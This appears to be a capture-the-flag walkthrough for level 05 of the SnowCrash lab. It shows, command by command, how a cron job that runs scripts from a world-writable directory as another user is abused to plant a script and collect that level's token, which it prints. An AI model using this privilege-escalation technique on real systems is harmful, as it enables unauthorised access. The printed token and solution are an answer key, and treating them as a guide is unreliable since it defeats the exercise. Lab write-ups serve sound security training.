# LEVEL 05

## Summary

To be continued...

## Workflow


```
ssh level05@<VM_IP> -p 4242
	_____                      _____               _     
	/ ____|                    / ____|             | |    
	| (___  _ __   _____      _| |     _ __ __ _ ___| |__  
	\___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
	____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	|_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
													
	Good luck & Have fun

level05@<VM_IP>'s password: 
You have new mail.
```

```
level05@SnowCrash:~$ env
...
MAIL=/var/mail/level05
...
```

```
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```


```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

```
level05@SnowCrash:~$ getfacl /opt/openarenaserver
getfacl: Removing leading '/' from absolute path names
# file: opt/openarenaserver
# owner: root
# group: root
user::rwx
user:level05:rwx
user:flag05:rwx
group::r-x
mask::rwx
other::r-x
default:user::rwx
default:user:level05:rwx
default:user:flag05:rwx
default:group::r-x
default:mask::rwx
default:other::r-x
```

```
level05@SnowCrash:~$ echo "
#!/bin/bash
getflag > /tmp/flag" > /opt/openarenaserver/getit
```

```
level05@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

To be continued...
